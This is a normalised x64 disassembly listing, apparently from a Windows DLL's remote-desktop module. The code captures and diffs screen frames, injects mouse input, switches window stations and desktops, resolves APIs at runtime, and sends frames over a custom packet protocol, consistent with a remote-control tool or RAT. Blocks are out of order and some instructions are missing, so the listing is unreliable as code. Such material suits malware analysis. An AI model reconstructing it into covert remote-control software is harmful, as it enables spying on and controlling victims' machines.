imul eax [ rdi + 0x64 ]
imul eax [ rdi + 0x60 ]
movsxd r8 eax
mov eax [ rdi + 0x64 ]
cdq
sub eax edx
sar eax 0x1
mov ecx eax
mov eax [ rdi + 0x60 ]
cdq
sub eax edx
sar eax 0x1
imul ecx eax
movsxd r8 ecx
jmp r-xdata
mov rdx [ rdi + 0x70 ]
mov rcx [ rdi + 0x78 ]
call memcpy
mov rax [ rdi + 0x40 ]
mov r9d [ rdi + 0x64 ]
mov rdx [ rdi + 0x58 ]
mov rcx [ rdi + 0x50 ]
mov [ rsp + 0x30 ] esi
mov [ rsp + 0x28 ] rax
mov rax [ rdi + 0x70 ]
xor r8d r8d
mov [ rsp + 0x20 ] rax
call [ GetDIBits@IAT ]
mov rcx [ rdi + 0x10 ]
mov rdi [ rsp + 0x78 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x58
jmp [ SetEvent@IAT ]
sub_1000cb80
sub rsp 0x28
mov eax [ rcx + 0x28 ]
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x48 ] rdi
movsxd rdi edx
mov rbx rcx
add rdi [ rcx + 0x70 ]
cmp eax 0x4
jne r-xdata
cdq
and edx 0x7
lea ebp [ rdx + rax ]
sar ebp 0x3
imul ebp r8d
mov eax r8d
cdq
sub eax edx
sar eax 0x1
mov ebp eax
jmp r-xdata
mov rdi [ rsp + 0x48 ]
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
xor eax eax
add rsp 0x28
retn
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x20 ] r12
movsxd r12 ebp
mov esi r9d
nop
nop
nop
test r9d r9d
jle r-xdata
cdq
and edx 0x7
add eax edx
sar eax 0x3
imul eax [ rbx + 0x60 ]
mov eax [ rbx + 0x60 ]
cdq
sub eax edx
sar eax 0x1
jmp r-xdata
movsxd rcx [ rbx + 0x90 ]
mov r8 r12
mov rdx rdi
add rcx [ rbx + 0x88 ]
call memcpy
mov eax [ rbx + 0x28 ]
add [ rbx + 0x90 ] ebp
cmp eax 0x4
jne r-xdata
mov r12 [ rsp + 0x20 ]
mov rsi [ rsp + 0x40 ]
cdqe
add rdi rax
sub rsi 0x1
jne r-xdata
sub_1000cc50
push rbx
sub rsp 0x470
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x460 ] rax
mov r8 [ rcx + 0x40 ]
mov rbx rcx
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x5c ]
mov r9d 0x400
add r8 0x28
mov [ rsp + 0x30 ] 0x400
mov [ rsp + 0x20 ] 0x8
call sub_10011660
mov r8d [ rsp + 0x30 ]
mov rcx [ rbx + 0x20 ]
lea rdx [ rsp + 0x40 ]
mov [ rsp + 0x54 ] r8d
add r8d 0x1c
mov [ rsp + 0x40 ] 0xa014
mov [ rsp + 0x50 ] 0xab07
call sub_10004860
mov rcx [ rsp + 0x460 ]
xor rcx rsp
call sub_10010a60
add rsp 0x470
pop rbx
retn
sub_1000cce0
sub rsp 0x68
mov [ rsp + 0x58 ] rbp
mov [ rsp + 0x50 ] rsi
lea eax [ rdx - 0x200 ]
xor ebp ebp
cmp eax 0xa
mov [ rsp + 0x40 ] r12
mov r12d r9d
mov esi edx
ja r-xdata
mov r12 [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
add rsp 0x68
retn
lea rdx [ __dos_header ]
cdqe
mov [ rsp + 0x60 ] rbx
mov ecx [ rdx + rax * 4 + 0xcddc ]
add rcx rdx
jmp rcx
mov ebx 0x1
jmp r-xdata
mov ebx 0x2
jmp r-xdata
mov ebx 0x4
jmp r-xdata
mov ebx 0x8
jmp r-xdata
mov ebx 0x10
jmp r-xdata
mov ebx 0x800
movzx ebp r8w
mov rbx [ rsp + 0x60 ]
mov [ rsp + 0x48 ] rdi
mov edi [ rsp + 0x90 ]
mov ecx r9d
mov edx edi
call [ SetCursorPos@IAT ]
cmp esi 0x200
je r-xdata
mov rdi [ rsp + 0x48 ]
mov rax [ rw-data ]
test rax rax
je r-xdata
xor edx edx
bts ebx 0xf
lea r8d [ rdx + 0x1c ]
mov [ rsp + 0x24 ] edx
mov [ rsp + 0x28 ] edx
mov [ rsp + 0x2c ] edx
mov [ rsp + 0x30 ] edx
mov [ rsp + 0x34 ] edx
mov [ rsp + 0x38 ] edx
mov [ rsp + 0x20 ] edx
lea ecx [ r8 - 0x1b ]
lea rdx [ rsp + 0x20 ]
mov [ rsp + 0x24 ] r12d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x2c ] ebp
mov [ rsp + 0x30 ] ebx
call rax
sub_1000ce10
sub rsp 0x48
mov rax [ rw-data ]
test rax rax
je r-xdata
add rsp 0x48
retn
xor ecx ecx
cmp edx 0x101
mov [ rsp + 0x20 ] 0x1
mov [ rsp + 0x24 ] ecx
mov [ rsp + 0x24 ] r8w
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x2c ] ecx
mov [ rsp + 0x30 ] ecx
mov [ rsp + 0x34 ] ecx
mov [ rsp + 0x38 ] ecx
je r-xdata
mov [ rsp + 0x28 ] 0x2
cmp edx 0x105
mov [ rsp + 0x28 ] ecx
jne r-xdata
mov r8d 0x1c
lea rdx [ rsp + 0x20 ]
lea ecx [ r8 - 0x1b ]
call rax
sub_1000ce80
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx + 0x30 ] 0x1
mov rcx [ rcx + 0x38 ]
test rcx rcx
je r-xdata
mov [ rbx + 0x38 ] 0x0
add rsp 0x20
pop rbx
retn
mov edx 0xffffffff
call [ WaitForSingleObject@IAT ]
sub_1000cef0
mov [ rsp + 0x10 ] edx
mov rax rsp
sub rsp 0x78
mov [ rax - 0x10 ] rbp
mov ebp [ rcx + 0x28 ]
mov [ rax - 0x18 ] rsi
cmp ebp 0x4
mov [ rax - 0x20 ] rdi
mov [ rax - 0x28 ] r12
mov [ rax - 0x30 ] r13
mov [ rax - 0x38 ] r14
mov [ rax - 0x40 ] r15
mov rax [ rcx + 0x70 ]
movsxd r10 edx
mov r14d r9d
lea rdi [ r10 + rax ]
mov rax [ rcx + 0x78 ]
mov r13d r8d
lea rsi [ r10 + rax ]
mov r15 rcx
jne r-xdata
mov eax ebp
cdq
and edx 0x7
lea r12d [ rdx + rax ]
sar r12d 0x3
imul r12d [ rcx + 0x60 ]
mov eax [ rcx + 0x60 ]
cdq
sub eax edx
sar eax 0x1
mov r12d eax
jmp r-xdata
xor eax eax
cmp ebp 0x4
jne r-xdata
mov [ rsp + 0x70 ] rbx
xor ebx ebx
test r9d r9d
jle r-xdata
mov eax ebp
imul eax r13d
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov eax r13d
cdq
sub eax edx
sar eax 0x1
jmp r-xdata
mov edx [ rsp + 0x88 ]
mov r9d r14d
mov r8d r13d
mov rcx r15
call sub_1000cb80
mov eax 0xffffffff
jmp r-xdata
movsxd rcx r12d
add ebx 0x1
add rdi rcx
add rsi rcx
cmp ebx r14d
jl r-xdata
movsxd r8 eax
mov r9d 0x1
mov rdx rsi
mov rcx rdi
mov [ rsp + 0x20 ] 0x1
call memcmp
test eax eax
jne r-xdata
mov r15 [ rsp + 0x38 ]
mov r14 [ rsp + 0x40 ]
mov r13 [ rsp + 0x48 ]
mov r12 [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rbx [ rsp + 0x70 ]
add rsp 0x78
retn
sub_1000d010
push rbx
sub rsp 0x50
mov rbx rcx
mov rcx [ rcx + 0x20 ]
call sub_10004a20
test eax eax
jne r-xdata
add rsp 0x50
pop rbx
retn
mov rcx [ rbx + 0x20 ]
xor eax eax
lea rdx [ rsp + 0x30 ]
lea r8d [ rax + 0xc ]
mov [ rsp + 0x30 ] eax
mov [ rsp + 0x34 ] eax
mov [ rsp + 0x38 ] eax
call sub_10004db0
test eax eax
js r-xdata
cmp eax 0xc
jne r-xdata
mov eax [ rsp + 0x30 ]
sub eax 0xab02
je r-xdata
mov rcx rbx
mov [ rbx + 0x30 ] 0x1
call sub_1000ce80
mov rcx [ rbx + 0x20 ]
lea rdx [ rsp + 0x40 ]
mov [ rsp + 0x40 ] 0xab02
call sub_10004b40
sub eax 0x2
je r-xdata
movzx edx [ rsp + 0x34 ]
movzx r8d [ rsp + 0x36 ]
mov rcx rbx
call sub_1000ce10
add rsp 0x50
pop rbx
retn
sub eax 0x2
je r-xdata
mov eax [ rsp + 0x34 ]
cmp eax 0x4
je r-xdata
cmp eax 0x2
mov rcx rbx
je r-xdata
cmp eax [ rbx + 0x28 ]
jne r-xdata
cmp eax 0x8
je r-xdata
movzx r8d [ rsp + 0x34 ]
movzx eax [ rsp + 0x3a ]
movzx r9d [ rsp + 0x38 ]
mov edx r8d
mov [ rsp + 0x20 ] eax
call sub_1000cce0
add rsp 0x50
pop rbx
retn
mov [ rbx + 0x30 ] 0x1
call sub_1000ce80
add rsp 0x50
pop rbx
retn
mov rcx [ rbx + 0x10 ]
mov [ rbx + 0x8 ] eax
call [ ResetEvent@IAT ]
mov rcx [ rbx + 0x10 ]
mov edx 0x32
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0x10 ]
call [ ResetEvent@IAT ]
mov rcx [ rbx + 0x10 ]
mov edx 0x32
call [ WaitForSingleObject@IAT ]
mov [ rbx + 0x2c ] 0x1
add rsp 0x50
pop rbx
retn
mov rcx rbx
mov [ rbx + 0x30 ] 0x1
call sub_1000ce80
add rsp 0x50
pop rbx
retn
cmp eax 0x10
je r-xdata
cmp eax 0x18
jne r-xdata
sub_1000d170
sub rsp 0x28
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rdi
mov rdi rcx
mov ebx edx
call sub_1000cec0
test bl 0x1
mov rbx [ rsp + 0x40 ]
je r-xdata
mov rax rdi
mov rdi [ rsp + 0x48 ]
add rsp 0x28
retn
mov rcx rdi
call ??3@YAXPEAX@Z
sub_1000d1b0
sub rsp 0x68
mov [ rsp + 0x78 ] rbp
mov [ rsp + 0x60 ] r12
mov [ rsp + 0x50 ] r14
mov r14d [ rcx + 0x60 ]
mov rbp rcx
mov eax 0x66666667
imul r14d
mov r12d edx
sar r12d 0x4
mov eax r12d
shr eax 0x1f
add r12d eax
lea ecx [ r12 + r12 * 4 ]
shl ecx 0x3
sub r14d ecx
je r-xdata
mov r8d [ rbp + 0x64 ]
mov eax 0x66666667
imul r8d
mov ecx edx
sar ecx 0x4
mov eax ecx
shr eax 0x1f
add ecx eax
mov [ rsp + 0x34 ] ecx
lea eax [ rcx + rcx * 4 ]
shl eax 0x3
sub r8d eax
mov [ rsp + 0x38 ] r8d
je r-xdata
add r12d 0x1
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x80 ] rsi
mov [ rsp + 0x88 ] rdi
mov [ rsp + 0x58 ] r13
mov [ rsp + 0x48 ] r15
xor edi edi
xor r15d r15d
xor r13d r13d
xor esi esi
test ecx ecx
mov [ rbp + 0x90 ] 0x9
jle r-xdata
add ecx 0x1
mov [ rsp + 0x34 ] ecx
mov rax [ rbp + 0x80 ]
mov r15 [ rsp + 0x48 ]
mov r14 [ rsp + 0x50 ]
mov r12 [ rsp + 0x60 ]
mov rdi [ rsp + 0x88 ]
mov rsi [ rsp + 0x80 ]
movsxd rcx r13d
lea edx [ r13 + 0x1 ]
test r13d r13d
mov r13 [ rsp + 0x58 ]
mov [ rax + rcx * 2 ] 0xffff
mov eax [ rbp + 0x90 ]
lea ebx [ rax + rdx * 2 ]
jle r-xdata
test r8d r8d
mov r9d 0x28
mov [ rsp + 0x30 ] r9d
je r-xdata
mov rbp [ rsp + 0x78 ]
mov rbx [ rsp + 0x70 ]
xor eax eax
add rsp 0x68
retn
mov rax [ rbp + 0x88 ]
movsxd r8 edx
mov [ rax ] ebx
mov rcx [ rbp + 0x88 ]
mov eax [ rbp + 0x90 ]
mov [ rcx + 0x4 ] eax
mov rcx [ rbp + 0x88 ]
movzx eax [ rbp + 0x28 ]
mov [ rcx + 0x8 ] al
movsxd rcx [ rbp + 0x90 ]
mov rdx [ rbp + 0x80 ]
add rcx [ rbp + 0x88 ]
add r8 r8
call memcpy
mov rcx [ rbp + 0x98 ]
mov r8 [ rbp + 0x88 ]
lea rdx [ rsp + 0x34 ]
add rcx 0x1c
mov r9d ebx
mov [ rsp + 0x34 ] ebx
mov [ rsp + 0x20 ] 0x8
call sub_10011660
mov eax [ rsp + 0x34 ]
mov rbp [ rsp + 0x78 ]
mov rbx [ rsp + 0x70 ]
add rsp 0x68
retn
xor ebx ebx
test r12d r12d
jle r-xdata
lea eax [ rcx - 0x1 ]
cmp r15d eax
cmove r9d r8d
mov [ rsp + 0x30 ] r9d
add r15d 0x1
cmp r15d ecx
jl r-xdata
nop
nop
mov eax r15d
imul eax [ rbp + 0x60 ]
add eax ebx
lea ecx [ rax + rax * 4 ]
mov eax [ rbp + 0x28 ]
shl ecx 0x3
cmp eax 0x4
jne r-xdata
lea eax [ r12 - 0x1 ]
cmp ebx eax
cmove r8d r14d
cdq
and edx 0x7
add eax edx
sar eax 0x3
imul eax ecx
mov eax ecx
cdq
sub eax edx
sar eax 0x1
jmp r-xdata
mov r9d [ rsp + 0x30 ]
add ebx 0x1
add edi 0x1
cmp ebx r12d
jl r-xdata
mov rax [ rbp + 0x80 ]
add r13d 0x1
add rsi 0x1
mov [ rax + rsi * 2 - 0x2 ] di
mov edx eax
mov rcx rbp
call sub_1000cef0
test eax eax
je r-xdata
test r14d r14d
mov r8d 0x28
je r-xdata
mov ecx [ rsp + 0x34 ]
mov r8d [ rsp + 0x38 ]
sub_1000d400
sub rsp 0x38
mov [ rcx + 0x2c ] 0x1
mov [ rsp + 0x50 ] rbx
mov rbx rcx
mov rcx [ rcx + 0x20 ]
call sub_10004a20
test eax eax
jne r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x38
retn
mov [ rsp + 0x58 ] rdi
xor edi edi
nop
nop
mov rdi [ rsp + 0x58 ]
cmp [ rbx + 0x30 ] edi
jne r-xdata
mov rcx [ rbx + 0x18 ]
call [ ResetEvent@IAT ]
mov rcx rbx
call sub_1000ca20
cmp [ rbx + 0x2c ] edi
je r-xdata
lea rcx [ rsp + 0x40 ]
call [ GetCursorPos@IAT ]
movzx r11d [ rsp + 0x40 ]
movzx eax [ rsp + 0x44 ]
mov rcx rbx
mov [ rsp + 0x28 ] r11w
mov [ rsp + 0x2a ] ax
call sub_1000d1b0
test eax eax
jle r-xdata
cmp [ rbx + 0x8 ] 0x10
jge r-xdata
mov eax [ rbx + 0x68 ]
cmp [ rsp + 0x40 ] eax
jne r-xdata
mov rdx [ rbx + 0x98 ]
lea r8d [ rax + 0x1c ]
mov [ rdx ] 0xa014
mov [ rdx + 0x10 ] 0xab05
movzx ecx [ rsp + 0x40 ]
mov [ rdx + 0x18 ] cx
movzx ecx [ rsp + 0x44 ]
mov [ rdx + 0x14 ] eax
mov [ rdx + 0x1a ] cx
mov rdx [ rbx + 0x98 ]
mov rcx [ rbx + 0x20 ]
call sub_10004860
test eax eax
je r-xdata
mov eax [ rbx + 0x64 ]
mov rcx [ rbx + 0x70 ]
xor edx edx
imul eax [ rbx + 0x60 ]
shl eax 0x2
movsxd r8 eax
call memset
mov rcx rbx
call sub_1000ca20
mov r11d [ rbx + 0x8 ]
mov [ rbx + 0x2c ] edi
mov [ rbx + 0x28 ] r11d
mov rcx rbx
call sub_1000cc50
test eax eax
js r-xdata
mov rcx [ rbx + 0x20 ]
lea rdx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] 0xab03
call sub_10004b40
test eax eax
je r-xdata
mov eax [ rbx + 0x6c ]
cmp [ rsp + 0x44 ] eax
je r-xdata
jmp r-xdata
mov eax [ rsp + 0x40 ]
mov [ rbx + 0x68 ] eax
mov eax [ rsp + 0x44 ]
mov [ rbx + 0x6c ] eax
mov rcx [ rbx + 0x18 ]
mov edx 0x1f4
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0x20 ]
call sub_10004a20
test eax eax
je r-xdata
mov rax [ rbx + 0x20 ]
cmp [ rax + 0x28 ] edi
jne r-xdata
sub_1000d580
sub rsp 0x28
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x20 ] r12
mov r12 rcx
call [ GetProcessWindowStation@IAT ]
test rax rax
mov rbx rax
je r-xdata
mov r12 [ rsp + 0x20 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
mov [ rsp + 0x38 ] rbp
call [ GetCurrentThreadId@IAT ]
mov ecx eax
call [ GetThreadDesktop@IAT ]
test rax rax
mov rbp rax
je r-xdata
mov rbp [ rsp + 0x38 ]
lea rcx [ r--data ]
xor edx edx
mov r8d 0x2000000
mov [ rsp + 0x48 ] rdi
call [ OpenWindowStationA@IAT ]
test rax rax
mov rdi rax
je r-xdata
mov rdi [ rsp + 0x48 ]
mov rcx rax
call [ SetProcessWindowStation@IAT ]
test eax eax
je r-xdata
mov rcx rdi
call [ CloseWindowStation@IAT ]
lea rcx [ r--data ]
mov r9d 0x2000000
xor r8d r8d
xor edx edx
mov [ rsp + 0x40 ] rsi
call [ OpenDesktopA@IAT ]
test rax rax
mov rsi rax
je r-xdata
mov rcx rbx
call [ SetProcessWindowStation@IAT ]
mov rsi [ rsp + 0x40 ]
mov rcx rax
call [ SetThreadDesktop@IAT ]
test eax eax
je r-xdata
mov rcx rsi
call [ CloseDesktop@IAT ]
mov rcx r12
call sub_1000d400
mov rcx rbp
call [ SetThreadDesktop@IAT ]
sub_1000d670
sub rsp 0x48
cmp r8d 0x4
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rdi rcx
mov rsi rdx
mov [ rcx + 0x20 ] rdx
mov [ rcx + 0x28 ] r8d
je r-xdata
mov eax [ rcx + 0x28 ]
mov [ rcx + 0x8 ] eax
xor ecx ecx
call [ CreateCompatibleDC@IAT ]
lea rcx [ r--data ]
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rdi + 0x50 ] rax
call [ CreateDCA@IAT ]
mov edx 0x8
mov rcx rax
mov [ rdi + 0x48 ] rax
call [ GetDeviceCaps@IAT ]
mov rcx [ rdi + 0x48 ]
mov edx 0xa
mov [ rdi + 0x60 ] eax
call [ GetDeviceCaps@IAT ]
mov edx [ rdi + 0x60 ]
mov rcx [ rdi + 0x48 ]
mov r8d eax
mov [ rdi + 0x64 ] eax
call [ CreateCompatibleBitmap@IAT ]
mov [ rdi + 0x58 ] rax
mov eax [ rdi + 0x64 ]
imul eax [ rdi + 0x60 ]
shl eax 0x2
movsxd rcx eax
call ??2@YAPEAX_K@Z
mov [ rdi + 0x70 ] rax
mov eax [ rdi + 0x64 ]
imul eax [ rdi + 0x60 ]
shl eax 0x2
movsxd rcx eax
call ??2@YAPEAX_K@Z
mov rcx [ rdi + 0x70 ]
test rcx rcx
mov [ rdi + 0x78 ] rax
je r-xdata
cmp r8d 0x8
je r-xdata
mov rcx [ rdi + 0x78 ]
test rcx rcx
je r-xdata
mov eax [ rdi + 0x64 ]
xor edx edx
imul eax [ rdi + 0x60 ]
shl eax 0x2
movsxd r8 eax
call memset
cmp r8d 0x10
je r-xdata
mov eax 0x66666667
mov [ rsp + 0x58 ] rbx
imul [ rdi + 0x60 ]
mov eax 0x66666667
sar edx 0x4
mov ecx edx
shr ecx 0x1f
lea r8d [ rdx + rcx + 0x1 ]
imul [ rdi + 0x64 ]
sar edx 0x4
mov eax edx
shr eax 0x1f
lea ebx [ rdx + rax + 0x1 ]
imul ebx r8d
lea eax [ rbx + 0x2 ]
movsxd rcx eax
mov eax 0x2
mul rcx
mov rcx 0xffffffffffffffff
cmovo rax rcx
mov rcx rax
call ??2@YAPEAX_K@Z
mov [ rdi + 0x80 ] rax
mov eax [ rdi + 0x64 ]
imul eax [ rdi + 0x60 ]
lea eax [ rbx + rax * 2 ]
lea eax [ rax + rax + 0x9 ]
movsxd rbx eax
mov rcx rbx
call ??2@YAPEAX_K@Z
lea rcx [ rbx + 0x20 ]
mov [ rdi + 0x88 ] rax
call ??2@YAPEAX_K@Z
cmp [ rdi + 0x58 ] 0x0
mov [ rdi + 0x98 ] rax
je r-xdata
mov eax [ rdi + 0x64 ]
xor edx edx
imul eax [ rdi + 0x60 ]
shl eax 0x2
movsxd r8 eax
call memset
cmp r8d 0x18
je r-xdata
mov rcx rdi
call sub_1000c980
lea rdx [ rsp + 0x30 ]
mov rcx rsi
mov [ rsp + 0x30 ] 0xab02
call sub_10004b40
mov rdi [ rsp + 0x68 ]
mov rsi [ rsp + 0x60 ]
mov rbx [ rsp + 0x58 ]
xor eax eax
add rsp 0x48
retn
cmp [ rdi + 0x48 ] 0x0
je r-xdata
mov [ rcx + 0x28 ] 0x8
cmp [ rdi + 0x50 ] 0x0
je r-xdata
cmp [ rdi + 0x70 ] 0x0
je r-xdata
cmp [ rdi + 0x78 ] 0x0
je r-xdata
cmp [ rdi + 0x88 ] 0x0
je r-xdata
test rax rax
je r-xdata
movzx eax [ rdi + 0x60 ]
lea rcx [ rdi + 0x68 ]
mov [ rsp + 0x20 ] 0xab01
mov [ rsp + 0x24 ] ax
movzx eax [ rdi + 0x64 ]
mov [ rsp + 0x26 ] ax
call [ GetCursorPos@IAT ]
movzx r11d [ rdi + 0x68 ]
movzx eax [ rdi + 0x6c ]
lea rdx [ rsp + 0x20 ]
mov rcx rsi
mov [ rsp + 0x28 ] r11w
mov [ rsp + 0x2a ] ax
call sub_10004b40
lea rcx [ sub_1000d580 ]
mov r8 rdi
xor edx edx
call [ _beginthread@IAT ]
mov [ rdi + 0x38 ] rax
mov eax 0x1
mov rdi [ rsp + 0x68 ]
mov rsi [ rsp + 0x60 ]
mov rbx [ rsp + 0x58 ]
add rsp 0x48
retn
sub_1000d920
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov rcx [ rcx + 0x30 ]
test rcx rcx
je r-xdata
mov rdx [ rbx + 0x28 ]
test rdx rdx
je r-xdata
call [ rw-data ]
mov rdx [ rbx + 0x30 ]
mov cx 0x2
call [ rw-data ]
mov rcx [ rbx + 0x10 ]
test rcx rcx
je r-xdata
mov cx 0x1
call [ rw-data ]
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
call ??3@YAXPEAX@Z
add rsp 0x20
pop rbx
retn
call [ rw-data ]
mov rcx [ rbx + 0x18 ]
call ??3@YAXPEAX@Z
sub_1000d990
mov rax rsp
sub rsp 0x78
mov [ rax - 0x8 ] rbx
mov [ rax - 0x10 ] rbp
mov rbp [ rsp + 0xa8 ]
mov [ rax - 0x18 ] rsi
mov [ rax - 0x20 ] rdi
mov [ rax - 0x28 ] r12
mov [ rax - 0x30 ] r13
mov r13 [ rsp + 0xb0 ]
mov [ rax - 0x38 ] r14
xor r14d r14d
mov r12 rcx
mov ecx 0x4b8
mov [ r13 ] r14d
mov rsi r9
mov edi r8d
mov [ rbp ] r14b
mov rbx rdx
call ??2@YAPEAX_K@Z
mov rcx rax
mov [ r12 + 0x18 ] rax
call [ rw-data ]
mov r9 [ rsp + 0xa0 ]
mov rcx [ r12 + 0x18 ]
mov [ rsp + 0x38 ] 0x30000
mov [ rsp + 0x30 ] r14
mov r8 rsi
mov rdx rbx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] r14
call [ rw-data ]
mov rsi [ rsp + 0x60 ]
test rax rax
mov rbx rax
jne r-xdata
mov rcx [ r12 + 0x18 ]
call [ rw-data ]
test rax rax
je r-xdata
mov rcx [ r12 + 0x18 ]
call [ rw-data ]
test rax rax
mov rdi rax
je r-xdata
mov [ r12 + 0x18 ] rbx
xor eax eax
lea rdx [ r--data ]
mov r8 rax
mov rcx rbp
call [ sprintf@IAT ]
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rbp
[ rdi ]
not rcx
sub rcx 0x1
mov [ r13 ] ecx
mov rcx [ r12 + 0x18 ]
call ??3@YAXPEAX@Z
mov [ r12 + 0x18 ] r14
mov eax 0xffffffff
jmp r-xdata
mov rdx rax
sub rbp rax
nop
nop
nop
mov r14 [ rsp + 0x40 ]
mov r13 [ rsp + 0x48 ]
mov r12 [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
mov rbp [ rsp + 0x68 ]
mov rbx [ rsp + 0x70 ]
add rsp 0x78
retn
movzx ecx [ rdx ]
add rdx 0x1
test cl cl
mov [ rdx + rbp - 0x1 ] cl
jne r-xdata
xor eax eax
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
sub rcx 0x1
mov [ r13 ] ecx
sub_1000db00
mov rax rsp
sub rsp 0x48
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov [ rax - 0x8 ] r12
mov [ rax - 0x10 ] r13
mov r12 rcx
mov rcx rdx
mov [ rax - 0x18 ] r14
mov r13 rdx
call [ rw-data ]
mov rbx [ r12 + 0x10 ]
movsxd rbp eax
add rbx 0x4
xor esi esi
test eax eax
mov [ rbx - 0x4 ] ebp
jle r-xdata
mov rcx r13
call [ rw-data ]
test rax rax
mov r11 rax
je r-xdata
lea r14d [ rsi + 0x64 ]
nop
mov rcx r13
call [ rw-data ]
mov rdx rbx
sub rdx [ r12 + 0x10 ]
cmp rdx 0x4
jbe r-xdata
xor r8d r8d
test ebp ebp
jle r-xdata
mov rcx r13
call [ rw-data ]
jmp r-xdata
mov r8d [ rax + 0x38 ]
cmp r8d 0x1
jg r-xdata
mov r14 [ rsp + 0x30 ]
mov r13 [ rsp + 0x38 ]
mov r12 [ rsp + 0x40 ]
mov rdi [ rsp + 0x68 ]
mov rsi [ rsp + 0x60 ]
mov rbp [ rsp + 0x58 ]
mov rbx [ rsp + 0x50 ]
add rsp 0x48
retn
sub ebx [ r12 + 0x10 ]
mov r9 [ r12 + 0x10 ]
mov rcx [ r12 + 0x8 ]
mov r8d ebx
mov edx 0xa01d
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] ebx
call sub_10004e70
mov rcx r13
call [ rw-data ]
test rax rax
mov r11 rax
jne r-xdata
nop
cmp r8d r14d
cmovg r8d r14d
mov r8d 0xa
jmp r-xdata
add r8 0x1
cmp r8 rbp
jl r-xdata
mov rax rbx
sub rax [ r12 + 0x10 ]
cmp rax 0xff000
jge r-xdata
movzx eax [ rcx ]
add rdx 0x1
add rcx 0x1
test al al
mov [ rdx - 0x1 ] al
jne r-xdata
mov rdi [ r11 ]
xor eax eax
mov rcx 0xffffffffffffffff
[ rdi ]
mov eax [ r11 + 0x68 ]
add esi 0x1
not rcx
add rbx rcx
add rbx 0xc
cmp esi ebp
mov [ rbx - 0xc ] eax
mov [ rbx - 0x8 ] r8d
mov eax [ r11 + 0x60 ]
mov [ rbx - 0x4 ] eax
jl r-xdata
mov rcx [ rax ]
mov rdx rbx
nop
nop
nop
mov rcx [ r11 + r8 * 8 ]
test rcx rcx
je r-xdata
mov rdx rbx
nop
mov edx esi
mov rcx r13
call [ rw-data ]
test rax rax
mov r11 rax
je r-xdata
movzx eax [ rcx ]
add rdx 0x1
add rcx 0x1
test al al
mov [ rdx - 0x1 ] al
jne r-xdata
mov rdi [ r11 + r8 * 8 ]
xor eax eax
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
add rbx rcx
sub_1000dcd0
push rdi
sub rsp 0x30
mov r10 rcx
xor eax eax
mov rdi rdx
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
sub rcx 0x1
test ecx ecx
jle r-xdata
add rsp 0x30
pop rdi
retn
mov [ rsp + 0x28 ] ax
lea r8d [ rcx + rcx + 0xa ]
mov [ rsp + 0x20 ] ecx
mov rcx [ r10 + 0x8 ]
mov r9 rdx
mov edx 0xa01c
call sub_10004e70
sub_1000dd20
push rbx
sub rsp 0x20
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
test rax rax
mov rbx rax
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
cmp [ rw-data ] 0x0
mov [ rw-data ] rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
